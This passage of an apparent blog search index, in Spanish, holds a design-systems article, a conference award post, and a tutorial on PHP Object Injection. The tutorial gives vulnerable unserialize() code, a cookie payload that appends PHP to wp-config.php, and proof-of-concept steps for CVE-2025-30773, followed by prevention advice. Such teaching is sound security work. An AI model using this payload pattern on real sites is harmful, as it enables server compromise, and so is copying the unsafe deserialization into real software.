\"lingua franca\" facilita la comunicaci\u00f3n, reduce malentendidos y agiliza los procesos de revisi\u00f3n y aprobaci\u00f3n, creando un flujo de trabajo m\u00e1s armonioso.</p>"},{"location":"es/blog/posts/27-04-2025/#escalabilidad","title":"Escalabilidad","text":"<p>A medida que una empresa crece y diversifica sus productos digitales, un Design System bien implementado crece con ella. A\u00f1adir nuevas funcionalidades o adaptar las existentes resulta m\u00e1s sencillo cuando se parte de una base s\u00f3lida y estructurada.</p>"},{"location":"es/blog/posts/27-04-2025/#facilita-las-pruebas-y-el-control-de-calidad","title":"Facilita las pruebas y el control de calidad","text":"<p>Al utilizar componentes estandarizados que ya han sido probados exhaustivamente, se reducen los errores y se facilita el proceso de QA. Cada componente puede ser validado individualmente, asegurando que funcione correctamente antes de integrarlo en un contexto m\u00e1s amplio.</p>"},{"location":"es/blog/posts/27-04-2025/#mejora-la-accesibilidad","title":"Mejora la accesibilidad","text":"<p>Un buen Design System incorpora consideraciones de accesibilidad desde su concepci\u00f3n. Esto asegura que todos los productos que lo utilicen cumplan con est\u00e1ndares de accesibilidad sin requerir esfuerzos adicionales por parte de los equipos de dise\u00f1o o desarrollo.</p>"},{"location":"es/blog/posts/27-04-2025/#reduce-la-deuda-tecnica-y-de-diseno","title":"Reduce la deuda t\u00e9cnica y de dise\u00f1o","text":"<p>Al establecer est\u00e1ndares claros y mantener una documentaci\u00f3n actualizada, se minimiza la acumulaci\u00f3n de \"parches\" o soluciones improvisadas que suelen generar problemas a largo plazo.</p>"},{"location":"es/blog/posts/27-04-2025/#contras-y-desafios","title":"Contras y desaf\u00edos","text":""},{"location":"es/blog/posts/27-04-2025/#inversion-inicial-significativa","title":"Inversi\u00f3n inicial significativa","text":"<p>Desarrollar un Design System completo requiere una inversi\u00f3n considerable de tiempo, recursos y esfuerzo. Es un proyecto a medio-largo plazo cuyos beneficios no siempre son inmediatamente visibles, lo que puede dificultar su justificaci\u00f3n en entornos donde se priorizan los resultados a corto plazo.</p>"},{"location":"es/blog/posts/27-04-2025/#resistencia-al-cambio","title":"Resistencia al cambio","text":"<p>Implementar un Design System implica cambios en los flujos de trabajo establecidos. Es com\u00fan encontrar resistencia por parte de equipos acostumbrados a trabajar con mayor autonom\u00eda o con sus propias metodolog\u00edas.</p>"},{"location":"es/blog/posts/27-04-2025/#mantenimiento-continuo","title":"Mantenimiento continuo","text":"<p>Un Design System no es un proyecto que se completa y se archiva; requiere mantenimiento, actualizaciones y evoluci\u00f3n constantes. Sin un compromiso firme con su mantenimiento, puede quedar obsoleto r\u00e1pidamente o, peor a\u00fan, convertirse en un obst\u00e1culo en lugar de una herramienta.</p>"},{"location":"es/blog/posts/27-04-2025/#puede-limitar-la-creatividad","title":"Puede limitar la creatividad","text":"<p>Algunos dise\u00f1adores pueden sentir que trabajar dentro de los confines de un sistema limita su libertad creativa. Encontrar el equilibrio entre estandarizaci\u00f3n y flexibilidad es uno de los mayores desaf\u00edos en el dise\u00f1o y gesti\u00f3n de estos sistemas.</p>"},{"location":"es/blog/posts/27-04-2025/#complejidad-en-su-implementacion","title":"Complejidad en su implementaci\u00f3n","text":"<p>Para organizaciones grandes o con ecosistemas digitales extensos, la transici\u00f3n hacia un Design System puede resultar extremadamente compleja, especialmente si implica modificar productos existentes para adaptarlos al nuevo sistema.</p>"},{"location":"es/blog/posts/27-04-2025/#requiere-compromiso-organizacional","title":"Requiere compromiso organizacional","text":"<p>El \u00e9xito de un Design System depende del compromiso de toda la organizaci\u00f3n, desde la direcci\u00f3n hasta los equipos operativos. Sin este apoyo transversal, es probable que el proyecto no alcance todo su potencial.</p>"},{"location":"es/blog/posts/27-04-2025/#curva-de-aprendizaje","title":"Curva de aprendizaje","text":"<p>Los nuevos miembros del equipo necesitar\u00e1n tiempo para familiarizarse con el Design System, su estructura, componentes y reglas. Esto puede ralentizar inicialmente la incorporaci\u00f3n de nuevos talentos.</p> <p>Tras comprender los m\u00faltiples beneficios y desaf\u00edos asociados a los Design Systems, surge inevitablemente una cuesti\u00f3n pragm\u00e1tica: \u00bfcu\u00e1ndo es realmente ventajoso invertir en su desarrollo? No todos los contextos empresariales o proyectos justifican esta inversi\u00f3n de recursos. Al igual que cualquier herramienta estrat\u00e9gica, su implementaci\u00f3n debe responder a necesidades espec\u00edficas y alinearse con los objetivos organizacionales. Analicemos, por tanto, los escenarios donde un Design System puede marcar una diferencia significativa y aquellos donde quiz\u00e1s existan alternativas m\u00e1s eficientes.</p>"},{"location":"es/blog/posts/27-04-2025/#cuando-tiene-sentido-implementar-un-design-system","title":"\u00bfCu\u00e1ndo tiene sentido implementar un Design System?","text":"<p>Un Design System resulta especialmente valioso en los siguientes escenarios:</p> <ul> <li>Cuando la empresa gestiona m\u00faltiples productos digitales que necesitan mantener coherencia visual y funcional.</li> <li>En equipos grandes o distribuidos donde la comunicaci\u00f3n y coordinaci\u00f3n suponen un desaf\u00edo.</li> <li>En proyectos a largo plazo donde la eficiencia en el desarrollo y mantenimiento es crucial.</li> <li>Cuando se busca escalar r\u00e1pidamente la capacidad de producci\u00f3n digital sin comprometer la calidad.</li> </ul> <p>Por el contrario, podr\u00eda no ser la mejor inversi\u00f3n para:</p> <ul> <li>Startups en fases muy tempranas con recursos limitados y un \u00fanico producto.</li> <li>Proyectos puntuales o de corta duraci\u00f3n.</li> <li>Equipos muy peque\u00f1os donde la comunicaci\u00f3n y consistencia se gestionan de manera natural.</li> </ul> <p>La decisi\u00f3n de implementar un Design System debe basarse en un an\u00e1lisis cuidadoso de las necesidades espec\u00edficas, recursos disponibles y objetivos a largo plazo de la organizaci\u00f3n. Como hemos visto, no es una soluci\u00f3n universal, pero cuando se implementa en el contexto adecuado, puede transformar radicalmente la eficiencia y calidad del dise\u00f1o digital.</p> <p>Una vez evaluada la pertinencia de implementar un Design System y habiendo decidido embarcarse en este viaje, surge inevitablemente la pregunta pr\u00e1ctica: \u00bfpor d\u00f3nde empezamos? Hasta ahora, hemos explorado los fundamentos conceptuales, desde la estructura at\u00f3mica hasta las consideraciones estrat\u00e9gicas, pero el camino desde la teor\u00eda hasta la implementaci\u00f3n t\u00e9cnica requiere una hoja de ruta clara. A continuaci\u00f3n, esbozaremos los siguientes pasos que transformar\u00e1n estos conceptos en herramientas tangibles para nuestros equipos de dise\u00f1o y desarrollo.</p>"},{"location":"es/blog/posts/27-04-2025/#whats-next-del-concepto-a-la-implementacion","title":"What's Next: Del Concepto a la Implementaci\u00f3n","text":"<p>El verdadero valor de un Design System se materializa cuando pasa de ser un concepto a convertirse en un conjunto de herramientas pr\u00e1cticas que los equipos utilizan diariamente. Este proceso de implementaci\u00f3n t\u00e9cnica implica varios pasos fundamentales que conectan la teor\u00eda con la pr\u00e1ctica.</p>"},{"location":"es/blog/posts/27-04-2025/#definicion-y-documentacion-de-design-tokens","title":"Definici\u00f3n y Documentaci\u00f3n de Design Tokens","text":"<p>El primer paso consiste en transformar nuestros \"iones\" en tokens de dise\u00f1o concretos y documentados. Esto implica:</p> <ul> <li>Codificar cada valor de color, tipograf\u00eda y espaciado en variables utilizables</li> <li>Establecer convenciones de nomenclatura claras y coherentes</li> <li>Documentar el prop\u00f3sito y uso adecuado de cada token</li> <li>Crear sistemas de versionado para gestionar su evoluci\u00f3n</li> </ul>"},{"location":"es/blog/posts/27-04-2025/#desarrollo-de-la-libreria-de-componentes","title":"Desarrollo de la Librer\u00eda de Componentes","text":"<p>Con los tokens definidos, el siguiente paso es desarrollar una librer\u00eda de componentes funcionales que:</p> <ul> <li>Implemente los principios at\u00f3micos discutidos anteriormente</li> <li>Traduzca los dise\u00f1os visuales en c\u00f3digo reutilizable</li> <li>Incorpore los tokens como variables que determinan la apariencia</li> <li>Sea accesible desde diferentes plataformas y frameworks</li> </ul> <p>Este proceso puede implicar la creaci\u00f3n de componentes en diferentes tecnolog\u00edas seg\u00fan las necesidades del equipo (React, Vue, Angular, etc.) y requiere una estrecha colaboraci\u00f3n entre dise\u00f1adores y desarrolladores.</p>"},{"location":"es/blog/posts/27-04-2025/#estrategias-de-integracion-y-adopcion","title":"Estrategias de Integraci\u00f3n y Adopci\u00f3n","text":"<p>La implementaci\u00f3n t\u00e9cnica debe complementarse con estrategias que faciliten la adopci\u00f3n del sistema por parte de todos los equipos implicados. Esto incluye:</p> <ul> <li>Creaci\u00f3n de entornos de prueba y visualizaci\u00f3n de componentes (storybooks)</li> <li>Desarrollo de gu\u00edas de implementaci\u00f3n t\u00e9cnica</li> <li>Establecimiento de flujos de trabajo para la contribuci\u00f3n y mantenimiento</li> <li>Formaci\u00f3n y acompa\u00f1amiento a los equipos durante la transici\u00f3n</li> </ul> <p>En pr\u00f3ximos art\u00edculos, profundizaremos en cada uno de estos aspectos, explorando herramientas espec\u00edficas, metodolog\u00edas de implementaci\u00f3n y casos pr\u00e1cticos que ilustrar\u00e1n el proceso completo de creaci\u00f3n e integraci\u00f3n de un Design System en diferentes contextos organizacionales. Desde la configuraci\u00f3n de repositorios de tokens hasta la implementaci\u00f3n de componentes en c\u00f3digo, pasando por estrategias efectivas de documentaci\u00f3n y gesti\u00f3n del cambio, este viaje apenas comienza.</p>"},{"location":"es/blog/posts/27-04-2025/#referencias-y-lecturas-recomendadas","title":"Referencias y Lecturas Recomendadas","text":"<p>Este art\u00edculo se ha nutrido de la experiencia y conocimientos compartidos por profesionales y expertos del sector. A continuaci\u00f3n, presento algunas referencias fundamentales para quienes deseen profundizar en el mundo de los Design Systems:</p>"},{"location":"es/blog/posts/27-04-2025/#libros","title":"Libros","text":"<ul> <li>Frost, B. (2016). Atomic Design. https://atomicdesign.bradfrost.com/ Este libro, disponible gratuitamente online, establece las bases de la metodolog\u00eda Atomic Design que hemos explorado extensamente en este art\u00edculo.</li> </ul>"},{"location":"es/blog/posts/27-04-2025/#articulos-y-recursos-web","title":"Art\u00edculos y Recursos Web","text":"<ul> <li> <p>Nielsen Norman Group. (2022). \"Design Systems 101\". https://www.nngroup.com/articles/design-systems-101/ Una introducci\u00f3n concisa pero completa al concepto de Design Systems por uno de los grupos m\u00e1s respetados en UX.</p> </li> <li> <p>Toman, J. (2023). \"Beyond Atomic Design: Ions, Quarks and Design Tokens\". https://medium.com/designsystemsmastery/beyond-atomic-design-tokens-and-subatomic-particles Exploraci\u00f3n de las extensiones al modelo Atomic tradicional, incluyendo el concepto de iones que hemos integrado en nuestro enfoque.</p> </li> <li> <p>Clark, J. (2021). \"The Spectrum of Design Systems\". https://spectrum.adobe.com/page/design-systems/ Un an\u00e1lisis de diferentes enfoques y niveles de madurez en los Design Systems.   Jonatan Hernandez. \"LEGO, el mejor mentor de Design System | Parte 2 de 2\".   https://jonatanhernandez.substack.com/p/lego-el-mejor-mentor-de-design-system-69b Otra perspectiva sobre los iones.</p> </li> </ul>"},{"location":"es/blog/posts/27-04-2025/#design-systems-de-referencia","title":"Design Systems de Referencia","text":"<ul> <li> <p>Material Design (Google) Uno de los Design Systems m\u00e1s completos y documentados, que ha influido significativamente en el dise\u00f1o digital moderno.</p> </li> <li> <p>Carbon Design System (IBM) Un excelente ejemplo de Design System orientado a productos empresariales con consideraciones de accesibilidad integradas.</p> </li> <li> <p>Polaris (Shopify) Notable por su documentaci\u00f3n exhaustiva y enfoque centrado en principios de dise\u00f1o claros.</p> </li> <li> <p>Sistema de Dise\u00f1o Atlassian Un ejemplo de Design System que equilibra consistencia con flexibilidad para diversos productos.</p> </li> </ul>"},{"location":"es/blog/posts/27-04-2025/#herramientas-y-plataformas","title":"Herramientas y Plataformas","text":"<ul> <li> <p>Storybook Entorno de desarrollo para crear, documentar y probar componentes de interfaz de usuario de forma aislada.</p> </li> <li> <p>Figma Herramienta de dise\u00f1o colaborativo que facilita la creaci\u00f3n y mantenimiento de bibliotecas de componentes.</p> </li> </ul>"},{"location":"es/blog/posts/30-03-2025/","title":"El asesino en serie de PHP: La deserializaci\u00f3n insegura","text":"<p>Algunas vulnerabilidades pasan desapercibidas hasta que es demasiado tarde y definitivamente las PHP Object Injection son una de ellas. Esta vulnerabilidad a menudo desconocida permite a un atacante inyectar objetos PHP manipulados en una aplicaci\u00f3n, desencadenando una serie de consecuencias devastadoras como: ejecuci\u00f3n remota de c\u00f3digo, acceso no autorizado a archivos o escalada de privilegios.</p> <p>Este tipo de ataque es especialmente peligroso porque no siempre es evidente a primera vista. Puede estar latente en el c\u00f3digo durante a\u00f1os hasta que un atacante descubre c\u00f3mo explotarlo. Lo que parece una simple funcionalidad de almacenamiento o transmisi\u00f3n de datos puede convertirse en una puerta trasera que acabe comprometiendo la integridad del sistema.</p>","tags":["Ciberseguridad","Pentesting","PHP Object Injection","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/30-03-2025/#que-es-una-vulnerabilidad-php-object-injection","title":"\u00bfQu\u00e9 es una vulnerabilidad PHP Object Injection?","text":"<p>La vulnerabilidad PHP Object Injection ocurre cuando una aplicaci\u00f3n deserializa datos controlados por un atacante sin una validaci\u00f3n adecuada. Para comprenderlo mejor, imaginemos que una aplicaci\u00f3n utiliza serialization para guardar objetos en cookies, bases de datos o par\u00e1metros de entrada de usuario. Si un atacante puede manipular estos datos serializados, puede inyectar objetos maliciosos que, al deserializarse, ejecuten c\u00f3digo no deseado.</p> <p>Un ejemplo simple:</p> <pre><code>&lt;?php\nclass Usuario {\n    public $nombre;\n    public $isAdmin = false;\n}\n\n$usuario = new Usuario();\n$usuario-&gt;nombre = \"JohnDoe\";\n\n$serializado = serialize($usuario);\necho $serializado;\n?&gt;\n</code></pre> <p>Un atacante que pueda modificar la entrada de este objeto podr\u00eda cambiar la propiedad isAdmin a true, logrando acceso no autorizado a partes restringidas del sistema. Si bien esto ya puede suponer un peligro, el verdadero problema surge cuando la aplicaci\u00f3n deserializa objetos de clases que contienen \"m\u00e9todos m\u00e1gicos\" como <code>__wakeup()</code> o <code>__destruct()</code>, llegando en muchos casos a la ejecuci\u00f3n de c\u00f3digo arbitrario.</p>","tags":["Ciberseguridad","Pentesting","PHP Object Injection","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/30-03-2025/#metodos-magicos","title":"M\u00e9todos m\u00e1gicos","text":"<p>En PHP, los m\u00e9todos m\u00e1gicos son funciones especiales dentro de una clase que se ejecutan autom\u00e1ticamente bajo ciertas condiciones. Algunos de los m\u00e1s relevantes son:</p> <ul> <li><code>__wakeup()</code>: Se ejecuta al deserializar un objeto y suele ser utilizado para inicializar propiedades.</li> <li><code>__destruct()</code>: Se llama cuando un objeto es destruido. Si se implementa de manera insegura, un atacante podr\u00eda manipular la ejecuci\u00f3n del c\u00f3digo al final del ciclo de vida del objeto.</li> <li><code>__toString()</code>: Se invoca cuando un objeto es tratado como una cadena. Si dentro de este m\u00e9todo se ejecuta c\u00f3digo din\u00e1mico, podr\u00eda ser explotado para ejecutar comandos arbitrarios.</li> </ul>","tags":["Ciberseguridad","Pentesting","PHP Object Injection","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/30-03-2025/#impacto-de-una-vulnerabilidad-php-object-injection","title":"Impacto de una vulnerabilidad PHP Object Injection","text":"<p>El impacto de esta vulnerabilidad varia mucho en funci\u00f3n del contexto de la aplicaci\u00f3n afectada, en algunos casos la vulnerabilidad puede permitir a un atacante escalar privilegios, lo que le otorgar\u00eda un mayor control sobre el sistema afectado. Esto podr\u00eda derivar en la manipulaci\u00f3n de configuraciones cr\u00edticas, la creaci\u00f3n de puertas traseras para accesos futuros o incluso la desactivaci\u00f3n de medidas de seguridad implementadas en la aplicaci\u00f3n.</p> <p>Otro posible escenario de explotaci\u00f3n es la combinaci\u00f3n de PHP Object Injection con otras vulnerabilidades presentes en la aplicaci\u00f3n o en librer\u00edas de terceros. Esto podr\u00eda llegar a permitir la ejecuci\u00f3n remota de c\u00f3digo (RCE), facilitando que el atacante tome control total del servidor y comprometa otros sistemas relacionados.</p>","tags":["Ciberseguridad","Pentesting","PHP Object Injection","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/30-03-2025/#ejemplo-de-explotacion-de-php-object-injection","title":"Ejemplo de explotaci\u00f3n de PHP Object Injection","text":"<p>Para ilustrar un caso pr\u00e1ctico de explotaci\u00f3n, consideremos una aplicaci\u00f3n que utiliza serializaci\u00f3n para gestionar archivos de registro en un sitio WordPress.</p> <p>C\u00f3digo vulnerable:</p> <pre><code>&lt;?php\nclass Logger {\n    public $logFile = \"logs/app.log\";\n    public $message;\n\n    public function __destruct() {\n        file_put_contents($this-&gt;logFile, $this-&gt;message . \"\\n\", FILE_APPEND);\n    }\n}\n\n$cookie = $_COOKIE['session'] ?? '';\n$logEntry = unserialize(base64_decode($cookie));\n?&gt;\n</code></pre> <p>En este caso, si un atacante puede manipular la cookie session, podr\u00eda inyectar un objeto malicioso para sobrescribir $logFile y agregar cualquier cosa al archivo destino mediante el par\u00e1metro message. La forma de generar el payload ser\u00eda la siguiente:</p> <p>Explotaci\u00f3n:</p> <pre><code>&lt;?php\nclass Logger {\n    public $logFile = \"/var/www/htlm/wordpress/wp-config.php\";\n    public $message;\n\n    public function __destruct() {\n        file_put_contents($this-&gt;logFile, $this-&gt;message . \"\\n\", FILE_APPEND);\n    }\n}\n\n$payload = new Logger();\n$payload-&gt;message = \"&lt;?php phpinfo(); ?&gt;\";\n$session = base64_encode(serialize($payload));\necho \"session=$session\";\n?&gt;\n</code></pre> <p>Si el atacante logra que esta cookie sea deserializada, la entrada maliciosa se agregar\u00e1 al archivo , agregando c\u00f3digo PHP arbitrario que se ejecutara al acceder al archivo.</p>","tags":["Ciberseguridad","Pentesting","PHP Object Injection","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/30-03-2025/#ejemplo-real-desarrollando-una-poc-para-el-cve-2025-30773","title":"Ejemplo real, desarrollando una PoC para el CVE-2025-30773","text":"<p>En este ejemplo veremos un ejemplo real para una vulnerabilidad revelada recientemente, el CVE-2025-30773.</p> Publicaci\u00f3n del CVE-2025-30773 <p>Como vemos afecta a todas las versiones hasta la 2.9.7, asi que podemos ver que ha cambiado entre la 2.9.6 y la 2.9.7 para encontrar el punto de entrada y reproducir la vulnerabilidad. Para ello acudiremos al svn de los plugins de Wordpress. Ahi encontraremos el siguiente cambio en un archivo donde se sustituye el <code>unserialize</code> por <code>json_decode</code>:</p> Cambio relevante <p>Leyendo el c\u00f3digo vemos que el objeto deserializado proviene de <code>trp_updb_extra_params</code>, solo nos queda ver donde podemos manipular este par\u00e1metro y ya podremos hacer nuestra Prueba De Concepto funcional.</p> <p>Tras desplegar el plugin en una instancia de testing y revisar mas a fondo el c\u00f3digo vemos que este par\u00e1metro se pasa cuando se actualizan las tablas de la base de datos, es decir al llamar a la acci\u00f3n <code>trp_update_database</code> .</p> <p>A fin de no dar una prueba de concepto de un RCE para una vulnerabilidad publicada recientemente, en mi caso voy a a\u00f1adir al c\u00f3digo una clase de testing que simplemente imprima que se ha inyectado el objeto a deserializar. Aunque es bastante trivial conseguir una prueba de concepto con un gadget funcional</p> <pre><code>&lt;?php\nclass ObjectInjection\n{\n   public $test;\n\n   function __destruct(){\n        die(\"PHP Object Injection triggered destruct: \" . $this-&gt;test);\n   }\n\n  function __wakeup(){\n        die(\"PHP Object Injection triggered wakeup: \" . $this-&gt;test);\n   }\n}\n?&gt;\n</code></pre> <p>Con esto podemos construir un payload para llamar a esta clase de la siguiente manera:</p> <pre><code>&lt;?php\nclass ObjectInjection\n{\n   public $test;\n\n   function __destruct(){\n        die(\"PHP Object Injection triggered destruct: \" . $this-&gt;test);\n   }\n\n  function __wakeup(){\n        die(\"PHP Object Injection triggered wakeup: \" . $this-&gt;test);\n   }\n}\n\n$a = new ObjectInjection();\n$b = base64_encode(serialize($a));\necho $b;\n?&gt;\n</code></pre> <p>Y usarlo durante la actualizaci\u00f3n sustituyendo el par\u00e1metro por nuestro payload:</p> Prueba de concepto","tags":["Ciberseguridad","Pentesting","PHP Object Injection","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/30-03-2025/#como-prevenir-vulnerabilidades-de-php-object-injection","title":"C\u00f3mo prevenir vulnerabilidades de PHP Object Injection","text":"<p>Para mitigar el riesgo de PHP Object Injection, es fundamental seguir buenas pr\u00e1cticas de seguridad en el desarrollo:</p> <ul> <li> <p>Evitar el uso de <code>unserialize()</code> con datos no confiables: Siempre preferir formatos de datos seguros como JSON en lugar de serializaci\u00f3n PHP.</p> </li> <li> <p>Implementar allowlist de clases permitidas al deserializar objetos: PHP 7.0 introduce <code>unserialize()</code> con allowed_classes para restringir qu\u00e9 clases pueden deserializarse.</p> </li> <li> <p>Eliminar clases innecesarias con m\u00e9todos m\u00e1gicos peligrosos.</p> </li> <li> <p>Realizar auditor\u00edas de seguridad y pruebas de penetraci\u00f3n peri\u00f3dicas.</p> </li> </ul> <p>La vulnerabilidad PHP Object Injection puede parecer un problema t\u00e9cnico menor, pero en el contexto adecuado, se convierte en una herramienta peligrosa para los atacantes. Aplicar las medidas preventivas adecuadas es clave para mantener nuestras aplicaciones seguras y protegidas de posibles explotaciones.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Pentesting","PHP Object Injection","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/30-11-2024/","title":"XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT","text":"<p>El pasado Martes, tuvimos el honor de asistir a la XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT, celebradas en los cines Kin\u00e9polis de la Ciudad de la Imagen en Madrid. El prop\u00f3sito principal de este viaje fue recibir un premio concedido a nuestro equipo de ciberseguridad, que result\u00f3 ganador de una competici\u00f3n nacional organizada por la Universidad de Granada en colaboraci\u00f3n con El Mando Conjunto del Ciberespacio (MCCE) y el Instituto Nacional de Ciberseguridad (INCIBE). Este reconocimiento no solo nos llena de orgullo, si no que tambi\u00e9n refuerza nuestro compromiso con las nuevas generaciones y nuestra confianza en el inmenso talento de estos j\u00f3venes profesionales.</p> <p>Adem\u00e1s, aprovechamos nuestro tiempo en este importante evento para empezar a hacernos un hueco en el sector, estableciendo conexiones con otras empresas, aprendiendo de las experiencias y siendo asesorados por organizaciones l\u00edderes en el panorama tecnol\u00f3gico tanto a nivel nacional como internacional.</p> <p>Estamos convencidos de que este es el camino correcto, y salimos de Madrid con un gran entusiasmo para ayudar a todas las empresas que conf\u00edan en nosotros para alcanzar la excelencia.</p> <p>#XVIIIJORNADASCCNCERT #VIJORNADASESPDEFCERT</p> Nuestro equipo en el photocall <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","CCN-CERT","Premios"]}]}